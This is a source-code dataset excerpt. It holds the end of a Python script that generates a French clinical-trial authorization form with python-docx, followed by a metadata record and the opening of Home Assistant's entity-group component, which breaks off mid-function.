\"E.8.9      Estimation initiale de la dur\u00e9e de l'essai  (en ann\u00e9es, mois et jours) : \"+extract['duree_totale_etude']+\"\\n\")\n    table.cell(11,0).text=(\"E.8.9.1   en France : \t      ann\u00e9es       mois       jours\\n\"\n                           \"E.8.9.2\t dans tous les pays concern\u00e9s par l\u2019essai : \t      ann\u00e9es       mois       jours\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2 or n==7:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1 or n==4 or n==6 or n==9 or n==11 or n==12:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(4,4)\n    a.merge(b)\n    a=table.cell(1,5)\n    b=table.cell(4,5)\n    a.merge(b)\n    a=table.cell(5,0)\n    b=table.cell(9,4)\n    a.merge(b)\n    a=table.cell(5,5)\n    b=table.cell(9,5)\n    a.merge(b)\n    a=table.cell(10,0)\n    b=table.cell(11,5)\n    a.merge(b)\n    \ndef Partie_F_G(document, extract):\n    \n    '''Partie F'''\n    paragraph=document.add_paragraph(\"\\nF. PERSONNES PARTICIPANT A L'ESSAI\\n\", style='debut_page')\n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"F.1\tTranche d'\u00e2ge \u00e9tudi\u00e9e\")\n    table.cell(1,0).text=(\"F.1.1\tMoins de 18 ans\\n\"\n                          \"Si oui, pr\u00e9ciser :\\n\"\n                          \"F.1.1.1  In Utero\\n\"\n                          \"F.1.1.2  Nouveaux-n\u00e9s pr\u00e9matur\u00e9s (jusqu\u2019\u00e0 l\u2019\u00e2ge gestationnel \u2264 37 semaines)\\n\"\n                          \"F.1.1.3  Nouveau-n\u00e9s (0-27 jours)\\n\"\n                          \"F.1.1.4  Nourrissons (28 jours - 23 mois)\\n\"\n                          \"F.1.1.5  Enfants (2-11 ans)\\n\"\n                          \"F.1.1.6  Adolescents (12-17 ans)\\n\"\n                          \"F.1.2     De 18 \u00e0 65 ans\\n\"\n                          \"F.1.3\tPlus de 65 ans\")\n    table.cell(1,5).text=(\"\u25a1 oui   \u25a1 non\\n\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    \n    '''Partie F2'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"F.2\tSEXE\")\n    table.cell(1,0).text=(\"F.2.1     Femmes    \u25a1\\n\"\n                          \"F.2.2\tHommes    \u25a1\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie F3'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=3, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"F.3\tGROUPE DE PERSONNES PARTICIPANT A L'ESSAI\")\n    table.cell(1,0).text=(\"F.3.1         Volontaires sains\\n\"\n                          \"F.3.2         Volontaires malades\\n\"\n                          \"F.3.3         Populations particuli\u00e8res\")\n    table.cell(2,0).text=(\"F.3.3.1      Femmes en \u00e2ge de procr\u00e9er\\n\"\n                          \"F.3.3.2      Femmes en \u00e2ge de procr\u00e9er utilisant un moyen de contraception\\n\"\n                          \"F.3.3.3      Femmes enceintes\\n\"\n                          \"F.3.3.4      Femmes allaitantes\\n\"\n                          \"F.3.3.5      Personnes en situation d\u2019urgence\\n\"\n                          \"F.3.3.6\t    Personnes incapables de donner personnellement leur consentement\t\\n\"\n                          \"F.3.3.6.1   Si oui, pr\u00e9ciser :   \\n\"   \n                          \"F.3.3.7\t    Autre\\n\"\n                          \"F.3.3.7.1   Si oui, pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\\n\u25a1 oui   \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    \n    '''Partie F4'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"F.4\tNOMBRE PREVU DE PERSONNES A INCLURE\")\n    table.cell(1,0).text=(\"F.4.1\tEn France\\n\"\n                          \"F.4.2\tEn cas d'essai  men\u00e9 dans plusieurs pays :\\n\"\n                          \"F.4.2.1\tDans la Communaut\u00e9 europ\u00e9enne\\n\"\n                          \"F.4.2.2\tPour l\u2019ensemble de la recherche\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie F5'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=1, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"F.5\tTRAITEMENT(S) OU SOIN(S) PREVU(S) POUR LES PERSONNES A LA FIN DE LEUR PARTICIPATION A L'ESSAI  Si cela diff\u00e9re du traitement habituel de la condition m\u00e9dicale \u00e9tudi\u00e9e, veuillez pr\u00e9ciser (texte libre) :      \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie G'''\n    paragraph=document.add_paragraph(\"\\nG. LIEUX DE RECHERCHES ENVISAGES / INVESTIGATEURS EN FRANCE\\n\", style='debut_page')\n    \n    '''Partie G1'''\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"G.1\tINVESTIGATEUR COORDONNATEUR (si essai multicentrique) et investigateur principal (si essai monocentrique) \")\n    table.cell(1,0).text=(\"G.1.1\tPr\u00e9nom :  \"+extract['investigateur_coordinateur_prenom']+\"    \\n\"\n                          \"G.1.2\tSecond pr\u00e9nom, le cas \u00e9ch\u00e9ant :   \\n\"\n                          \"G.1.3    Nom : \"+extract['investigateur_coordinateur_nom']+\"\\n\"\n                          \"G.1.4\tQualification, sp\u00e9cialit\u00e9 :   \"+extract['investigateur_coordinateur_qualification']+\"   \\n\"\n                          \"G.1.5\tAdresse professionnelle :  \"+extract['investigateur_coordinateur_adresse_professionnelle']+\"    \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie G2'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=1, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"G.2\tINVESTIGATEURS PRINCIPAUX (si essai multicentrique ; r\u00e9p\u00e9ter cette section autant de fois que n\u00e9cessaire) \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    for i in range(len(extract['autre_investigateur_nom'])):\n        table = document.add_table(rows=1, cols=1, style='Table Grid')\n        table.cell(0,0).text=(\"G.2.1\tPr\u00e9nom :  \"+extract['autre_investigateur_prenom'][i]+\"   \\n\" \n                              \"G.2.2\tSecond pr\u00e9nom, le cas \u00e9ch\u00e9ant :  \"+\"\\n\"\n                              \"G.2.3    Nom : \"+extract['autre_investigateur_nom'][i]+\"    \\n\"\n                              \"G.2.4\tQualification, sp\u00e9cialit\u00e9 :  \"+extract['autre_investigateur_qualification'][i]+\"    \\n\"\n                              \"G.2.5\tAdresse professionnelle :  \"+extract['autre_investigateur_adresse_professionnelle'][i])\n        for row in table.rows:\n            for cell in row.cells:\n                paragraphs = cell.paragraphs\n                for paragraph in paragraphs:\n                    for run in paragraph.runs:\n                        fontdebut = run.font\n                        fontdebut.name = 'Arial'\n                        fontdebut.size = docx.shared.Pt(10)\n    '''Partie G3'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"G.3\tPLATEAU TECHNIQUE UTILISE AU COURS DE L'ESSAI\\nLaboratoire ou autre plateau technique o\u00f9 sont effectu\u00e9es de fa\u00e7on centralis\u00e9e les mesures ou \u00e9valuations des param\u00e8tres ou crit\u00e8res principaux \u00e9tudi\u00e9s dans l'essai (\u00e0 compl\u00e9ter pour chaque organisme, r\u00e9p\u00e9ter la section si n\u00e9cessaire)\")\n    table.cell(1,0).text=(\"G.3.1\tOrganisme :  \"+extract['plateau_technique_organisme']+\"    \\n\"\n                          \"G.3.2\tNom de la personne \u00e0 contacter : \"+extract['plateau_technique_personne_contact']+\"     \\n\"\n                          \"G.3.3\tAdresse :  \"+extract['plateau_technique_adresse']+\"    \\n\"\n                          \"G.3.4\tNum\u00e9ro de t\u00e9l\u00e9phone : \"+extract['plateau_technique_num_telephone']+\"     \\n\"\n                          \"G.3.5\tT\u00e2ches confi\u00e9es : \"+extract['plateau_technique_taches_confiees']+\"     \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie G4'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"G.4\tPRESTATAIRE A QUI LE PROMOTEUR A CONFIE CERTAINES OBLIGATIONS ET FONCTIONS AFFERENTES A L'ESSAI (\u00e0 compl\u00e9ter pour chaque organisme, r\u00e9p\u00e9ter la section si n\u00e9cessaire)\")\n    table.cell(1,0).text=(\"G.4.1\t    Le promoteur a-t-il confi\u00e9 en partie ou en totalit\u00e9 des obligations et des fonctions majeures lui incombant au titre de l'essai \u00e0 un autre organisme ou \u00e0 un tiers ?\\n\"\n                          \"Pr\u00e9ciser pour chaque organisme :\\n\"\n                          \"G.4.1.1\t    Organisme :      \\n\"\n                          \"G.4.1.2\t    Nom de la personne \u00e0 contacter :    \\n\"  \n                          \"G.4.1.3\t    Adresse :      \\n\"\n                          \"G.4.1.4\t    Num\u00e9ro de t\u00e9l\u00e9phone :      \\n\"\n                          \"Obligations / fonctions confi\u00e9es :\\n\"\n                          \"G.4.1.5     Ensemble des t\u00e2ches du promoteur\\n\"\n                          \"G.4.1.6     Monitoring\\n\"\n                          \"G.4.1.7     R\u00e9glementaire (ex : pr\u00e9paration des dossiers soumis \u00e0 l'Afssaps et au CPP)\\n\"\n                          \"G.4.1.8     Recrutement des investigateurs\\n\"\n                          \"G.4.1.9     IVRS  - tirage au sort du traitement\\n\"\n                          \"G.4.1.10   Gestion/collecte des donn\u00e9es\\n\"\n                          \"G.4.1.11   Saisie \u00e9lectronique des donn\u00e9es\\n\"\n                          \"G.4.1.12   D\u00e9claration des effets ind\u00e9sirables graves et/ou incidents graves \\n\"\n                          \"G.4.1.13   Audit de l'assurance qualit\u00e9\\n\"\n                          \"G.4.1.14   Analyses statistiques\\n\"\n                          \"G.4.1.15   R\u00e9daction m\u00e9dicale\\n\"\n                          \"G.4.1.16    Autres devoirs confi\u00e9s\\n\"\n                          \"G.4.1.16.1  Si oui, veuillez pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\u25a1 oui   \u25a1 non\\n\\n\\n\\n\\n\\n\\n\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    \ndef Partie_H_I(document, extract):\n    \n    '''Partie H'''\n    \n    paragraph=document.add_paragraph()\n    sentence=paragraph.add_run(\"\\nH. ANSM / CPP CONCERNE PAR LA DEMANDE\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.bold = True\n    fontdebut.size = docx.shared.Pt(10) \n    \n    '''Partie H1'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=3, style='Table Grid')\n    table.cell(0,0).text=(\"H.1\t  TYPE DE DEMANDE\\n\"\n                          \"Si cette demande est adress\u00e9e \u00e0 l\u2019ANSM, cocher la case 'CPP' et indiquer les informations relatives au CPP concern\u00e9, et vice-versa.\")\n    table.cell(1,0).text=(\"H.1.1\t   ANSM\\n\"\n                          \"H.1.2\t   CPP\\n\")\n    table.cell(1,2).text=(\"\u25a1\\n\u25a1\")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    fontdebut.bold = True\n    a=table.cell(0,0)\n    b=table.cell(0,2)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(1,1)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"H.2\t   INFORMATIONS RELATIVES A L'ANSM / AU CPP\")\n    table.cell(1,0).text=(\"H.2.1       Nom et adresse :      \\n\"\n                          \"H.2.2\t   Date de soumission : \\n\")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    fontdebut.bold = True\n    \n    '''Partie H3'''\n    paragraph=document.add_paragraph()\n    sentence=paragraph.add_run(\"\\nSi cette demande est adress\u00e9e au CPP remplir les informations ci-dessous :\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.size = docx.shared.Pt(10) \n    \n    table = document.add_table(rows=3, cols=3, style='Table Grid')\n    table.cell(0,0).text=(\"H.3\tAUTORISATION / AVIS\")\n    table.cell(1,0).text=(\"H.3.1    A demander\\n\"\n                          \"H.3.2\tEn cours\\n\"\n                          \"H.3.3\tObtenu(e)\t\")\n    table.cell(2,0).text=(\"\tSi obtenu(e), pr\u00e9ciser :\t\\n\"\n                          \"H.3.3.1  Date de la d\u00e9cision :   /  /  \\n\"\n                          \"H.3.3.2  Autorisation\\n\"\n                          \"H.3.3.3\t  Refus d'autorisation\t\\n\"\n                          \"\tSi refus d'autorisation, pr\u00e9ciser :\\n\"\n                          \"H.3.3.3.1\tLes motifs :      \\n\"\n                          \"H.3.3.3.2\tLa date \u00e9ventuelle envisag\u00e9e de resoumission de le demande :      \")\n    table.cell(1,2).text=(\"\u25a1\\n\u25a1\\n\u25a1\\n\\n\\n\u25a1\\n\u25a1\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,2)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,1)\n    a.merge(b)\n    a=table.cell(1,2)\n    b=table.cell(2,2)\n    a.merge(b)\n    \n    document.add_page_break()\n    \n    '''Partie I'''\n    \n    paragraph=document.add_paragraph(\"\\nI. SIGNATURE DU DEMANDEUR EN FRANCE\", style='debut_page')\n    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=1, cols=8, style='Table Grid')\n    table.cell(0,0).text=(\"I.1\")\n    table.cell(0,1).text=(\"Par la pr\u00e9sente, j\u2019atteste / j\u2019atteste au nom du promoteur (rayer la mention inutile) ce qui suit :\\n\"\n                          \"-\tles informations fournies ci-dessus \u00e0 l\u2019appui de la demande sont exactes ;\\n\"\n                          \"-\tl'essai sera r\u00e9alis\u00e9 conform\u00e9ment au protocole, \u00e0 la r\u00e9glementation nationale et aux principes de bonnes pratiques ;\\n\"\n                          \"-\til est raisonnable de mettre en \u0153uvre la recherche propos\u00e9e ; \\n\"\n                          \"-\tje m'engage \u00e0 d\u00e9clarer les effets ind\u00e9sirables graves et/ou incidents  et \u00e0 soumettre les rapports de s\u00e9curit\u00e9, conform\u00e9ment \u00e0 la r\u00e9glementation applicable ;\\n\"\n                          \"-\tje m'engage \u00e0 soumettre un r\u00e9sum\u00e9 du rapport final de l'essai \u00e0 l\u2019ANSM au plus tard 1 an apr\u00e8s la fin de l'essai dans tous les pays.\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,1)\n    b=table.cell(0,7)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"I.2\tDEMANDEUR AUPRES DE L'ANSM (tel qu'indiqu\u00e9 en C.1)\")\n    table.cell(0,1).text=(\"I.2.1     Date :   /  /    \\n\"\n                          \"I.2.2     Signature  :   \\n\"\n                          \"I.2.3\tNom :      \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"I.3\tDEMANDEUR AUPRES DU CPP (tel qu'indiqu\u00e9 en C.2)\")\n    table.cell(0,1).text=(\"I.3.1     Date :   /  /    \\n\"\n                          \"I.3.2     Signature  :   \\n\"\n                          \"I.3.3\tNom :      \")   \n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    \n    \n    \n    \n    \n    \n    "}
{"blob_id": "b01da9bd1afbad9b2abf843c06a37b692c241678", "directory_id": "a245e53f25b320151ac00e759979aa2b6d41b1c4", "path": "/homeassistant/components/group/__init__.py", "content_id": "a49b5fa5af827be408c57e5d82cebe34d4bd31b1", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "kkostecki/AIS-home-assistant", "snapshot_id": "db01015de62ff076d4e9b8faf8ed04ee2c92d651", "revision_id": "66d41db1b3884286a3cd9f736fcd1f5ac64fdcb7", "branch_name": "refs/heads/master", "visit_date": "2022-11-04 21:07:09.286031", "revision_date": "2020-07-01 09:43:17", "committer_date": "2020-07-01 09:43:17", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "17808", "extension": "py", "content": "\"\"\"Provide the functionality to group entities.\"\"\"\nimport asyncio\nimport logging\nfrom typing import Any, Iterable, List, Optional, cast\n\nimport voluptuous as vol\n\nfrom homeassistant import core as ha\nfrom homeassistant.const import (\n    ATTR_ASSUMED_STATE,\n    ATTR_ENTITY_ID,\n    ATTR_ICON,\n    ATTR_NAME,\n    CONF_ICON,\n    CONF_NAME,\n    ENTITY_MATCH_ALL,\n    ENTITY_MATCH_NONE,\n    SERVICE_RELOAD,\n    STATE_CLOSED,\n    STATE_HOME,\n    STATE_LOCKED,\n    STATE_NOT_HOME,\n    STATE_OFF,\n    STATE_OK,\n    STATE_ON,\n    STATE_OPEN,\n    STATE_PROBLEM,\n    STATE_UNKNOWN,\n    STATE_UNLOCKED,\n)\nfrom homeassistant.core import callback\nimport homeassistant.helpers.config_validation as cv\nfrom homeassistant.helpers.entity import Entity, async_generate_entity_id\nfrom homeassistant.helpers.entity_component import EntityComponent\nfrom homeassistant.helpers.event import async_track_state_change\nfrom homeassistant.helpers.typing import HomeAssistantType\nfrom homeassistant.loader import bind_hass\n\n# mypy: allow-untyped-calls, allow-untyped-defs, no-check-untyped-defs\n\nDOMAIN = \"group\"\n\nENTITY_ID_FORMAT = DOMAIN + \".{}\"\n\nCONF_ENTITIES = \"entities\"\nCONF_ALL = \"all\"\n\nATTR_ADD_ENTITIES = \"add_entities\"\nATTR_AUTO = \"auto\"\nATTR_ENTITIES = \"entities\"\nATTR_OBJECT_ID = \"object_id\"\nATTR_ORDER = \"order\"\nATTR_ALL = \"all\"\n\nSERVICE_SET = \"set\"\nSERVICE_REMOVE = \"remove\"\n\n_LOGGER = logging.getLogger(__name__)\n\n\ndef _conf_preprocess(value):\n    \"\"\"Preprocess alternative configuration formats.\"\"\"\n    if not isinstance(value, dict):\n        value = {CONF_ENTITIES: value}\n\n    return value\n\n\nGROUP_SCHEMA = vol.All(\n    vol.Schema(\n        {\n            vol.Optional(CONF_ENTITIES): vol.Any(cv.entity_ids, None),\n            CONF_NAME: cv.string,\n            CONF_ICON: cv.icon,\n            CONF_ALL: cv.boolean,\n        }\n    )\n)\n\nCONFIG_SCHEMA = vol.Schema(\n    {DOMAIN: vol.Schema({cv.match_all: vol.All(_conf_preprocess, GROUP_SCHEMA)})},\n    extra=vol.ALLOW_EXTRA,\n)\n\n# List of ON/OFF state tuples for groupable states\n_GROUP_TYPES = [\n    (STATE_ON, STATE_OFF),\n    (STATE_HOME, STATE_NOT_HOME),\n    (STATE_OPEN, STATE_CLOSED),\n    (STATE_LOCKED, STATE_UNLOCKED),\n    (STATE_PROBLEM, STATE_OK),\n]\n\n\ndef _get_group_on_off(state):\n    \"\"\"Determine the group on/off states based on a state.\"\"\"\n    for states in _GROUP_TYPES:\n        if state in states:\n            return states\n\n    return None, None\n\n\n@bind_hass\ndef is_on(hass, entity_id):\n    \"\"\"Test if the group state is in its ON-state.\"\"\"\n    state = hass.states.get(entity_id)\n\n    if state:\n        group_on, _ = _get_group_on_off(state.state)\n\n        # If we found a group_type, compare to ON-state\n        return group_on is not None and state.state == group_on\n\n    return False\n\n\n@bind_hass\ndef expand_entity_ids(hass: HomeAssistantType, entity_ids: Iterable[Any]) -> List[str]:\n    \"\"\"Return entity_ids with group entity ids replaced by their members.\n\n    Async friendly.\n    \"\"\"\n    found_ids: List[str] = []\n    for entity_id in entity_ids:\n        if not isinstance(entity_id, str) or entity_id in (\n            ENTITY_MATCH_NONE,\n            ENTITY_MATCH_ALL,\n        ):\n            continue\n\n        entity_id = entity_id.lower()\n\n        try:\n            # If entity_id points at a group, expand it\n            domain, _ = ha.split_entity_id(entity_id)\n\n            if domain == DOMAIN:\n                child_entities = get_entity_ids(hass, entity_id)\n                if entity_id in child_entities:\n                    child_entities = list(child_entities)\n                    child_entities.remove(entity_id)\n                found_ids.extend(\n                    ent_id\n                    for ent_id in expand_entity_ids(hass, child_entities)\n                    if ent_id not in found_ids\n                )\n\n            else:\n                if entity_id not in found_ids:\n                    found_ids.append(entity_id)\n\n        except AttributeError:\n            # Raised by split_entity_id if entity_id is not a string\n            pass\n\n    return found_ids\n\n\n@bind_hass\ndef get_entity_ids(\n    hass: HomeAssistantType, entity_id: str, domain_filter: Optional[str] = None\n) -> List[str]:\n    \"\"\"Get members of this group.\n\n    Async friendly.\n    \"\"\"\n    group = hass.states.get(entity_id)\n\n    if not group or ATTR_ENTITY_ID not in group.attributes:\n        return []\n\n    entity_ids = group.attributes[ATTR_ENTITY_ID]\n    if not domain_filter:\n        return cast(List[str], entity_ids)\n\n    domain_filter = f\"{domain_filter.lower()}.\"\n\n    return [ent_id for ent_id in entity_ids if ent_id.startswith(domain_filter)]\n\n\n@bind_hass\ndef groups_with_entity(hass: HomeAssistantType, entity_id: str) -> List[str]:\n    \"\"\"Get all groups that contain this entity.\n\n    Async friendly.\n    \"\"\"\n    if DOMAIN not in hass.data:\n        return []\n\n    groups = []\n\n    for group in hass.data[DOMAIN].entities:\n        if entity_id in group.tracking:\n            groups.append(group.entity_id)\n\n    return groups\n\n\nasync def async_setup(hass, config):\n    \"\"\"Set up all groups found defined in the configuration.\"\"\"\n    component = hass.data.get(DOMAIN)\n\n    if component is None:\n        component = hass.data[DOMAIN] = EntityComponent(_LOGGER, DOMAIN, hass)\n\n    await _async_process_config(hass, config, component)\n\n    async def reload_service_handler(service):\n        \"\"\"Remove all user-defined groups and load new ones from config.\"\"\"\n        # auto = list(filter(lambda e: not e.user_defined, component.entities))\n        # fix for ais-dom groups defined in packages\n        auto = list(component.entities)\n\n        conf = await component.async_prepare_reload()\n        if conf is None:\n            return\n        await _async_process_config(hass, conf, component)\n\n        await component.async_add_entities(auto)\n\n    hass.services.async_register(\n        DOMAIN, SERVICE_RELOAD, reload_service_handler, schema=vol.Schema({})\n    )\n\n    service_lock = asyncio.Lock()\n\n    async def locked_service_handler(service):\n        \"\"\"Handle a service with an async lock.\"\"\"\n        async with service_lock:\n            await groups_service_handler(service)\n\n    async def groups_service_handler(service):\n        \"\"\"Handle dynamic group service functions.\"\"\"\n        object_id = service.data[ATTR_OBJECT_ID]\n        entity_id = f\"{DOMAIN}.{object_id}\"\n        group = component.get_entity(entity_id)\n\n        # new group\n        if service.service == SERVICE_SET and group is None:\n            entity_ids = (\n                service.data.get(ATTR_ENTITIES)\n                or service.data.get(ATTR_ADD_ENTITIES)\n                or None\n            )\n\n            extra_arg = {\n                attr: service.data[attr]\n                for attr in (ATTR_ICON,)\n                if service.data.get(attr) is not None\n            }\n\n            await Group.async_create_group(\n                hass,\n                service.data.get(ATTR_NAME, object_id),\n                object_id=object_id,\n                entity_ids=entity_ids,\n                user_defined=False,\n                mode=service.data.get(ATTR_ALL),\n                **extra_arg,\n            )\n            return\n\n        if group is None:\n            _LOGGER.warning(\"%s:Group '%s' doesn't exist!\", service.service, object_id)\n            return\n\n        # update group\n        if service.service == SERVICE_SET:\n            need_update = False\n\n            if ATTR_ADD_ENTITIES in service.data:\n                delta = service.data[ATTR_ADD_ENTITIES]\n                entity_ids = set(group.tracking) | set(delta)\n                await 